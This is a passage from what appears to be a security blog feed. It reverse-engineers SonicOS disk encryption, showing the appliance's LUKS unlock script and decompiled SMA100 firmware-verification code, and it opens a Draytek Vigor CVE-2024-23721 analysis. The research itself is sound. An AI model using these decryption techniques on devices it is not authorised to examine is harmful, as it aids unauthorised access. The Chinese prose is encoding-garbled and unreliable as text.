class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>;          &#125; ||</span><br><span class="line">  &#123; sunup_readLuksHeaderKey | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">just</span></span>() &#123;</span><br><span class="line">  <span class="built_in">set</span> -- $? <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">  <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">return</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># mount device node $1, cd, and run &quot;$&#123;@:2&#125;&quot;</span></span><br><span class="line"><span class="comment"># return false if mount fails, or exit code of command</span></span><br><span class="line"><span class="function"><span class="title">with_mount</span></span>() &#123;</span><br><span class="line">  <span class="built_in">set</span> -- <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span> <span class="string">&quot;<span class="subst">$(mktemp -d -p /mnt <span class="string">&quot;<span class="variable">$&#123;1##*/&#125;</span>-XXXXXX&quot;</span>)</span>&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> mount <span class="string">&quot;<span class="variable">$3</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="keyword">then</span> <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$&#123;@:4&#125;</span>&quot;</span></span><br><span class="line">       just <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">       just umount <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  just <span class="built_in">rmdir</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_with_mount</span></span>() &#123;</span><br><span class="line">  with_mount <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_unlockHardware_ssdUnlockDeviceProfile</span></span>() &#123;</span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span> <span class="variable">$&#123;1@Q&#125;</span> <span class="variable">$&#123;2@Q&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">local</span> dev=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> profile=<span class="string">&quot;<span class="variable">$2</span>&quot;</span> realdev=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> ]] || sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]: No device specified&#125;</span>&quot;</span> || <span class="built_in">return</span> 1</span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> ]] || sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]: No profile specified&#125;</span>&quot;</span> || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">  <span class="built_in">local</span> realdev=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  realdev=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;/dev/disk/by-id/block-storage-<span class="variable">$dev</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  sissy_info <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: unlocking <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$realdev</span>&quot;</span> = /dev/* ]]</span><br><span class="line">  <span class="keyword">then</span> </span><br><span class="line">    realdev=<span class="string">&quot;<span class="variable">$&#123;realdev/\/dev\//&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: Invalid realdev <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: ssdunlock -t <span class="variable">$&#123;profile@Q&#125;</span> <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">  ssdunlock -t <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> <span class="string">&quot;<span class="variable">$realdev</span>&quot;</span></span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span> <span class="variable">$&#123;1@Q&#125;</span> <span class="variable">$&#123;2@Q&#125;</span>: Status $?&quot;</span></span><br><span class="line">  <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_unlockHardwareAll</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> dev</span><br><span class="line">  <span class="keyword">for</span> dev <span class="keyword">in</span> <span class="variable">$&#123;DISKS_DEVICES_SSDUNLOCK:-&#125;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    disks_unlockHardware <span class="string">&quot;<span class="variable">$dev</span>&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">disks_unlockHardware</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> dev=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> profile=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  EXP_M0) profile=<span class="string">&quot;<span class="variable">$&#123;SSDUNLOCK_DEVICE_EXP_M0_PROFILE:-<span class="variable">$SSDUNLOCK_DEVICE_DEFAULT_PROFILE</span>&#125;</span>&quot;</span> ;;</span><br><span class="line">  EXP_M1) profile=<span class="string">&quot;<span class="variable">$&#123;SSDUNLOCK_DEVICE_EXP_M1_PROFILE:-<span class="variable">$SSDUNLOCK_DEVICE_DEFAULT_PROFILE</span>&#125;</span>&quot;</span> ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> ]]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    disks_unlockHardware_ssdUnlockDeviceProfile <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="string">&quot;<span class="variable">$profile</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: Unsupported device <span class="variable">$dev</span> profile <span class="variable">$profile</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_startEncryptedDisks</span></span>() &#123;</span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> Should we insist --type &quot;$LUKS&quot; ?</span></span><br><span class="line">  <span class="comment"># What if upgrade from LUKS1 ?</span></span><br><span class="line">  sissy_debug <span class="string">&quot;Disks commences, discover volume groups&quot;</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER</span>&quot;</span> <span class="comment"># look on /dev/disk/by-partlabel/BOOT</span></span><br><span class="line">  <span class="keyword">then</span> <span class="keyword">if</span> with_mount <span class="string">&quot;/dev/disk/by-partlabel/BOOT&quot;</span> recover_luks_header <span class="string">&quot;/tmp/<span class="variable">$LUKS_HEADER</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> || <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYNAME</span>&quot;</span> &amp;&amp; LUKS_SYSTEM_KEYID=$(keyctl search <span class="string">&quot;<span class="variable">$&#123;LUKS_KEYRING&#125;</span>&quot;</span> user <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYNAME</span>&quot;</span>) &amp;&amp; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span></span><br><span class="line">            <span class="keyword">then</span> <span class="comment"># optimise for correct key or adding newline</span></span><br><span class="line">                 &#123; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> ; <span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span> ; &#125; | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 ||</span><br><span class="line">                 &#123; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>  ; &#125; | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 ||</span><br><span class="line">                 sunup_readDiskKey | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">else</span> <span class="comment"># don&#x27;t correct keyring cos we can&#x27;t</span></span><br><span class="line">                 sunup_readDiskKey | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            just dmsetup mknodes &gt;/dev/null 2&gt;&amp;1 <span class="comment"># make sure they are present ready for vgchange</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  just <span class="built_in">rm</span> -f <span class="string">&quot;/tmp/<span class="variable">$LUKS_HEADER</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">local</span> dev</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> dev <span class="keyword">in</span> <span class="variable">$DEVICES_LUKS</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">if</span> <span class="built_in">test</span> -b <span class="string">&quot;<span class="variable">$dev</span>&quot;</span></span><br><span class="line">     <span class="keyword">then</span> sunup_readDiskKey | cryptsetup open --key-file /dev/stdin <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;dev##*/&#125;</span>&quot;</span></span><br><span class="line">     <span class="keyword">else</span> sissy_warn <span class="string">&quot;Device <span class="variable">$dev</span> not found&quot;</span></span><br><span class="line">     <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  just dmsetup mknodes &gt;/dev/null 2&gt;&amp;1 <span class="comment"># make sure they are present ready for vgchange</span></span><br><span class="line"></span><br><span class="line">  just vgchange -ay &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING: you probably shouldn&#x27;t be using disks_stopEncryptedDisks</span></span><br><span class="line"><span class="comment"># in most cases, as &quot;dmsetup remove_all&quot; is way too violent.</span></span><br><span class="line"><span class="function"><span class="title">disks_stopEncryptedDisks</span></span>() &#123;</span><br><span class="line">  sissy_debug <span class="string">&quot;Stopping encrypted disks&quot;</span></span><br><span class="line">  dmsetup remove_all &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_main</span></span>() &#123;</span><br><span class="line">  [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -eq 0 ] &amp;&amp; &#123;</span><br><span class="line">    sissy_msg <span class="string">&quot;Usage: disks [start|stop]&quot;</span></span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -gt 0 ] ; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;start&quot;</span>) disks_startEncryptedDisks ;;</span><br><span class="line">    <span class="string">&quot;stop&quot;</span>) disks_stopEncryptedDisks ;;</span><br><span class="line">    <span class="string">&quot;unlock-hardware-all&quot;</span>) disks_unlockHardwareAll <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span> ; <span class="built_in">return</span> $? ;;</span><br><span class="line">    <span class="string">&quot;unlock-hardware&quot;</span>) disks_unlockHardware <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span> ; <span class="built_in">return</span> $? ;;</span><br><span class="line">    *) sissy_warn <span class="string">&quot;unknown action <span class="variable">$1</span>&quot;</span> ; <span class="built_in">return</span> 1 ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sissy_moduleLoaded</span><br><span class="line">sissy_calledAsScript || <span class="built_in">return</span> 0 </span><br><span class="line">disks_main <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>è§£å¯†é€»è¾‘å¤§è‡´ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ä»å†…æ ¸å¯†é’¥é“¾åŠ è½½ TINY:SYSTEM-HEADER å¯†é’¥ï¼Œä½¿ç”¨è¿™ä¸ªå¯†é’¥è§£å¯† SYSTEM.SYS æ–‡ä»¶</span><br><span class="line">2. ä»å†…æ ¸å¯†é’¥é“¾åŠ è½½ TINY:SYSTEM å¯†é’¥ï¼Œç»“åˆ SYSTEM.SYS å¯¹ç£ç›˜è¿›è¡Œè§£å¯†</span><br></pre></td></tr></table></figure></div>

<p>SYSTEM.SYS å®é™…ä¸Šæ˜¯ä¸€ä¸ª LUKS header æ–‡ä»¶ï¼ŒLUKS æ”¯æŒå°† header å’ŒåŠ å¯†æ•°æ®åˆ†ç¦»ï¼Œåœ¨éœ€è¦æ—¶å¯ä»¥é€šè¿‡æŒ‡å®š â€“header å‚æ•°è®¾ç½® header æ–‡ä»¶è§£å¯†ç¡¬ç›˜ã€‚</p>
<p>æ‰€ä»¥åˆ°è¿™é‡Œæˆ‘ä»¬å°±ç†æ¸…äº† SonicOS 7.1 ç‰ˆæœ¬çš„ç£ç›˜è§£å¯†æ€è·¯ï¼ŒæŒ‰ç…§è¯¥æ€è·¯å¯ä»¥ç¼–å†™å‡ºæœ¬åœ°è§£å¯†è„šæœ¬ã€‚</p>
<p>å…·ä½“å®ç°è¯·å‚è€ƒä»“åº“ä»£ç ã€‚</p>
<h2 id="sig-å›ºä»¶"><a href="#sig-å›ºä»¶" class="headerlink" title=".sig å›ºä»¶"></a>.sig å›ºä»¶</h2><p>å®˜æ–¹ä¸ºç¡¬ä»¶è®¾å¤‡æä¾›çš„å‡çº§åŒ…éƒ½æ˜¯ .sig æ ¼å¼ï¼Œç†µå€¼åˆ†ææ˜¾ç¤ºå›ºä»¶éƒ½æ˜¯åŠ å¯†çš„ã€‚</p>
<p>è™šæ‹Ÿæœºçš„å‡çº§åŒ…å’Œ .sig æ–‡ä»¶æ ¼å¼ä¸åŒï¼Œæƒ³è¦åˆ†ææ ¼å¼å¯èƒ½éœ€è¦ç¡¬ä»¶è®¾å¤‡æ¥è°ƒè¯•ã€‚ä¸è¿‡åœ¨æŸ¥æ‰¾ç³»ç»Ÿé•œåƒæ—¶ï¼Œæˆ‘å‘ç° SonicWall çš„å¦ä¸€æ¬¾è®¾å¤‡ SMA100 çš„å‡çº§åŒ…ä¹Ÿæ˜¯ .sig æ ¼å¼ï¼Œå¹¶ä¸”è¿™æ¬¾è®¾å¤‡æä¾›è™šæ‹Ÿæœºé•œåƒã€‚</p>
<p>SMA100 å·²æœ‰<a class="link"   href="https://badmonkey.site/archives/sonicwall-sma-research" >å‰äºº<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>è¯¦ç»†ç ”ç©¶è¿‡ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œè§£åŒ…å¾—åˆ°ç³»ç»Ÿæ–‡ä»¶ä¹‹åï¼Œé€šè¿‡æœç´¢å’Œå‡çº§ç›¸å…³çš„ä¿¡æ¯å¯ä»¥å®šä½åˆ° upgradefirmware è¿™ä¸ªç¨‹åºï¼Œå®ƒè´Ÿè´£æ¥æ”¶ç”¨æˆ·ä¸Šä¼ çš„å›ºä»¶å¹¶æ£€æŸ¥æ˜¯å¦åˆæ³•ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804A58F</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">char</span> *data, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">5</span>]; <span class="comment">// [esp+24h] [ebp-A4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> sha_obj[<span class="number">25</span>]; <span class="comment">// [esp+38h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [esp+9Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *filename; <span class="comment">// [esp+A0h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+A4h] [ebp-24h]</span></span><br><span class="line">  <span class="type">size_t</span> header_length; <span class="comment">// [esp+A8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+ACh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *data_1; <span class="comment">// [esp+B0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+B4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">uint32_t</span> dataval_length; <span class="comment">// [esp+B8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+BCh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !data || size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">  v14 = sub_804B6A0(a1, a2, &amp;v8, &amp;filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// åˆå§‹åŒ–å‡ ä¸ªè·¯å¾„</span></span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    <span class="keyword">return</span> v14;</span><br><span class="line">  data_1 = data;</span><br><span class="line">  v5 = get_opcode(data);                        <span class="comment">// è·å–ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">  v12 = check_format(data_1, v5);               <span class="comment">// æ–‡ä»¶æ ¼å¼æ£€æŸ¥</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  sub_804D1A1(sha_obj, data_1, size);</span><br><span class="line">  sha1_wrap(sha_obj, v6);                       <span class="comment">// è®¡ç®— SHA1 å€¼</span></span><br><span class="line">  v12 = verify_file(data, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">  header_length = get_header_len(data_1);</span><br><span class="line">  dataval_length = get_data_len(data_1);</span><br><span class="line">  v10 = sub_804D3AC(data_1, size);</span><br><span class="line">  <span class="keyword">if</span> ( (header_length + dataval_length) &gt; size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; (get_opcode(data_1) == <span class="number">6</span> || get_opcode(data_1) == <span class="number">5</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( get_opcode(data_1) != <span class="number">10</span> &amp;&amp; get_opcode(data_1) != <span class="number">9</span> &amp;&amp; get_opcode(data_1) != <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( filename )                               <span class="comment">// /cf/firmware/new/FFWHDR.INF</span></span><br><span class="line">  &#123;</span><br><span class="line">    v16 = header_length &gt; <span class="number">1023</span> ? <span class="number">0</span> : <span class="number">1024</span> - header_length;</span><br><span class="line">    remove(filename);</span><br><span class="line">    v14 = split_header(data, header_length, v16, filename);<span class="comment">// æŠŠ header å†™å…¥æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> v14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( get_opcode(data_1) == <span class="number">10</span> || get_opcode(data_1) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dataval_length = aes_decrypt(v10, dataval_length, dataval_length, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataval_length == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_804C450(&amp;data[header_length], dataval_length, <span class="string">&quot;/cf/firmware/new/CRCHDR.INF&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€è¦æ¦‚æ‹¬æµç¨‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. è·å–ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°è·¯å¾„</span><br><span class="line">2. å›ºä»¶åˆ†ä¸º header å’Œ body ä¸¤ä¸ªéƒ¨åˆ†ï¼Œheader ä¸­åŒ…æ‹¬ DSA ç­¾åæ•°æ®</span><br><span class="line">3. ä»£ç è®¡ç®— body éƒ¨åˆ†çš„ SHA1 å€¼ï¼Œå¹¶ä½¿ç”¨å†…ç½®å…¬é’¥å¯¹æ–‡ä»¶å®Œæ•´æ€§è¿›è¡Œ DSA éªŒè¯</span><br><span class="line">4. åˆ†ç¦» header å’Œ body</span><br><span class="line">5. å¯¹ body è¿›è¡Œ AES è§£å¯†</span><br></pre></td></tr></table></figure></div>

<p>å®é™…ä¸Šæ˜¯ä½¿ç”¨å›ºå®šçš„ AES KEY å’Œ IV å¯¹å›ºä»¶è¿›è¡Œè§£å¯†ï¼Œå‚ç…§æµç¨‹å¯å®ç°è§£å¯†ç¨‹åºï¼Œå…·ä½“è¯·å‚è€ƒä»“åº“ä»£ç ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p>æœ¬æ–‡åˆ†æäº† SonicOS çš„ç£ç›˜å’Œå›ºä»¶åŠ å¯†æ–¹æ³•ï¼Œå®ç°äº†ç›¸åº”çš„è§£å¯†è„šæœ¬ï¼Œå¸Œæœ›èƒ½å¯¹æ„Ÿå…´è¶£çš„ç ”ç©¶è€…æœ‰ä¸€äº›å¸®åŠ©ã€‚</p>
<p><a class="link"   href="https://badmonkey.site/archives/sonicwall-sma-research" >https://badmonkey.site/archives/sonicwall-sma-research<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.gnu.org/software/grub/grub-download.html" >https://www.gnu.org/software/grub/grub-download.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>Draytek Vigor 3910 &amp; 2960 æ¼æ´åˆ†æ</title>
    <url>/2024/08/12/CVE-2024-23721/</url>
    <content><![CDATA[<p>æœ¬æ–‡å¯¹ Vigor 3910 çš„ CVE-2024-23721 å’Œ Vigor 2960 çš„ä¸€ä¸ªé™é»˜ä¿®å¤æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<p>Vigor 3910 å’Œ 2960 æ˜¯å°æ¹¾ Draytek(å±…æ˜“ç§‘æŠ€) å…¬å¸æ¨å‡ºçš„æ ¸å¿ƒç½‘å…³è®¾å¤‡ï¼Œå‡åŒ…å« VPN å’Œé˜²ç«å¢™åŠŸèƒ½ï¼Œå› æ­¤åœ¨ä¼ä¸šåœºæ™¯å…·æœ‰ä¸€å®šçš„åº”ç”¨ã€‚</p>
<h2 id="CVE-2024-23721"><a href="#CVE-2024-23721" class="headerlink" title="CVE-2024-23721"></a>CVE-2024-23721</h2><p>åœ¨ä¸Šä¸€ç¯‡<a href="https://wzt.ac.cn/2024/02/19/vigor_3910/">æ–‡ç« </a>ä¸­ç®€å•ä»‹ç»äº†é’ˆå¯¹ Vigor 3910 çš„å›ºä»¶è§£åŒ…å’Œæ¨¡æ‹Ÿè¿‡ç¨‹ï¼Œ3910 è®¾å¤‡åº•å±‚è¿è¡Œçš„æ˜¯ Linux ç³»ç»Ÿï¼Œåœ¨ç³»ç»Ÿä¸­ä½¿ç”¨ qemu æ¨¡æ‹Ÿå¯åŠ¨ sohod64.binï¼Œè¯¥æ–‡ä»¶æ˜¯ Draytek è‡ªè¡Œå®ç°çš„ DrayOS ç³»ç»Ÿï¼Œä¸šåŠ¡é€»è¾‘åŸºæœ¬é›†ä¸­åœ¨æ­¤æ–‡ä»¶ä¸­ã€‚</p>
<p>è§£åŒ…è¿‡ç¨‹ä¸å†èµ˜è¿°ï¼Œæˆ‘ä»¬ä»¥ 4.3.2.5 ç‰ˆæœ¬ä¸ºä¾‹æ¥åˆ†æã€‚è·å– sohod64.bin åé€†å‘åˆ†ææ­¤æ–‡ä»¶ï¼Œåœ¨ 0x40153890 åœ°å€æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ç§°ä¹‹ä¸º <code>process_rquest</code>ï¼Œè¯¥å‡½æ•°åº”è¯¥æ˜¯å¤„ç† HTTP è¯·æ±‚çš„å…¥å£ç‚¹ï¼Œä¼šè§£æè¯·æ±‚ä¸­çš„å„ä¸ªå­—æ®µ</p>
